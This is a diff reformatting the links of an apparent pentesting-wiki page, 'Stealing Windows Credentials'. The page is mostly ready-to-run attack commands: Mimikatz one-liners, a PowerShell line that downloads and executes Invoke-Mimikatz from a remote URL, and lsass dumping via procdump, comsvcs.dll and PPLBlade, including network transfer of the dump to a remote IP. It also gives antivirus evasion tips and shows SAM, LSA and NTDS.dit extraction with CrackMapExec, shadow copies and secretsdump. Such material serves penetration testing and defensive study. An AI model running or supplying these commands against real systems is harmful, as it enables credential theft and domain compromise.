@@ -1,6 +1,5 @@
 # Stealing Windows Credentials
 
-
 ## Credentials Mimikatz
 
 ```bash
@@ -16,8 +15,8 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-```
-**Find other things that Mimikatz can do in** [[credentials-mimikatz.md|**this page**]]**.**
+
+**Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 
@@ -26,12 +25,12 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-```
-[[credentials-protections.md|**Learn about some possible credentials protections here.**]] **This protections could prevent Mimikatz from extracting some credentials.**
+
+[**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
 
 ## Credentials with Meterpreter
 
-Use the [[https://github.com/carlospolop/MSF-Credentials|**Credentials Plugin**]] **that** I have created to **search for passwords and hashes** inside the victim.
+Use the [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **that** I have created to **search for passwords and hashes** inside the victim.
 
 ```bash
 #Credentials from SAM
@@ -49,15 +48,15 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-```
+
 ## Bypassing AV
 
 ### Procdump + Mimikatz
 
-As **Procdump from** [[https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite|**SysInternals** ]]**is a legitimate Microsoft tool**, it's not detected by Defender.\
+As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.\
 You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
 
-You could also use [[https://github.com/GhostPack/SharpDump|SharpDump]].
+You could also use [SharpDump](https://github.com/GhostPack/SharpDump).
 
 ```bash:Dump lsass
 #Local
@@ -68,15 +67,15 @@ Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 # Get it from webdav
 \\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-```
+
 ```c:Extract credentials from the dump
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-```
-This process is done automatically with [[https://github.com/aas-n/spraykatz|SprayKatz]]: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+
+This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
 **Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead of** the **name lsass.exe.**
 
@@ -85,15 +84,15 @@ This process is done automatically with [[https://github.com/aas-n/spraykatz|Spr
 A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
 It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
 Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
-Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [[https://en.hackndo.com/remote-lsass-dump-passwords|https://en.hackndo.com/remote-lsass-dump-passwords/]].
+Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 The following command is employed for execution:
 
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-```
-**You can automate this process with** [[https://github.com/Hackndo/lsassy|**lssasy**]]**.**
+
+**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
 ### **Dumping lsass with Task Manager**
 
@@ -104,16 +103,16 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 ### Dumping lsass with procdump
 
-[[https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Microsoft signed binary which is a part of [sysinternals](https://docs.microsoft.com/en-us/sysinternals/|Procdump]] suite.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Microsoft signed binary which is a part of [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
 
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-```
+
 ## Dumpin lsass with PPLBlade
 
-[[https://github.com/tastypepperoni/PPLBlade|**PPLBlade**]] is a Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is a Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.
 
 **Key functionalities**:
 
@@ -124,7 +123,7 @@ Get-Process -Name LSASS
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
-```
+
 ## CrackMapExec
 
 ### Dump SAM hashes
@@ -132,32 +131,32 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-```
+
 ### Dump LSA secrets
 
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-```
+
 ### Dump the NTDS.dit from target DC
 
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-```
+
 ### Dump the NTDS.dit password history from target DC
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-```
+
 ### Show the pwdLastSet attribute for each NTDS.dit account
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-```
+
 ## Stealing SAM & SYSTEM
 
 This files should be **located** in _C:\windows\system32\config\SAM_ and _C:\windows\system32\config\SYSTEM._ But **you cannot just copy them in a regular way** because they protected.
@@ -171,14 +170,14 @@ reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-```
+
 **Download** those files to your Kali machine and **extract the hashes** using:
 
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-```
+
 ### Volume Shadow Copy
 
 You can perform copy of protected files using this service. You need to be Administrator.
@@ -199,7 +198,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-```
+
 But you can do the same from **Powershell**. This is an example of **how to copy the SAM file** (the hard drive used is "C:" and its saved to C:\users\Public) but you can use this for copying any protected file:
 
 ```bash
@@ -210,17 +209,17 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-```
-Code from the book: [[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html|https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html]]
+
+Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 
 ### Invoke-NinjaCopy
 
-Finally, you could also use the [[https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1|**PS script Invoke-NinjaCopy**]] to make a copy of SAM, SYSTEM and ntds.dit.
+Finally, you could also use the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) to make a copy of SAM, SYSTEM and ntds.dit.
 
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-```
+
 ## **Active Directory Credentials - NTDS.dit**
 
 The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.
@@ -231,7 +230,7 @@ Within this database, three primary tables are maintained:
 - **Link Table**: It keeps track of relationships, such as group memberships.
 - **SD Table**: **Security descriptors** for each object are held here, ensuring the security and access control for the stored objects.
 
-More information about this: [[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/|http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/]]
+More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
 Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).
 
@@ -252,8 +251,8 @@ Available since Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-```
-You could also use the [[#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick|**volume shadow copy**]].
+
+You could also use the [**volume shadow copy**](#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).
 
 ### **Extracting hashes from NTDS.dit**
 
@@ -262,40 +261,40 @@ Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use too
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-```
+
 You can also **extract them automatically** using a valid domain admin user:
 
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-```
-For **big NTDS.dit files** it's recommend to extract it using [[https://github.com/c-sto/gosecretsdump|gosecretsdump]].
+
+For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
 Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ or **mimikatz** `lsadump::lsa /inject`
 
 ### **Extracting domain objects from NTDS.dit to an SQLite database**
 
-NTDS objects can be extracted to an SQLite database with [[https://github.com/almandin/ntdsdotsqlite|ntdsdotsqlite]]. Not only secrets are extracted but also the entire objects and their attributes for further information extraction when the raw NTDS.dit file is already retrieved.
+NTDS objects can be extracted to an SQLite database with [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Not only secrets are extracted but also the entire objects and their attributes for further information extraction when the raw NTDS.dit file is already retrieved.
 
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-```
+
 The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
 
 ## Lazagne
 
-Download the binary from [[https://github.com/AlessandroZ/LaZagne/releases|here]]. you can use this binary to extract credentials from several software.
+Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
 
 ```
 lazagne.exe all
 ```
-```
+
 ## Other tools for extracting credentials from SAM and LSASS
 
 ### Windows credentials Editor (WCE)
 
-This tool can be used to extract credentials from the memory. Download it from: [[https://www.ampliasecurity.com/research/windows-credentials-editor/|http://www.ampliasecurity.com/research/windows-credentials-editor/]]
+This tool can be used to extract credentials from the memory. Download it from: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
@@ -305,7 +304,7 @@ Extract credentials from the SAM file
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
-```
+
 ### PwDump
 
 Extract credentials from the SAM file
@@ -315,14 +314,12 @@ You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
 type outpwdump
 ```
-```
+
 ### PwDump7
 
-Download it from:[[http://www.tarasco.org/security/pwdump_7| http://www.tarasco.org/security/pwdump_7]] and just **execute it** and the passwords will be extracted.
+Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.
 
 ## Defenses
 
-[[credentials-protections.md|**Learn about some credentials protections here.**]]
-
-
+[**Learn about some credentials protections here.**](credentials-protections.md)
 
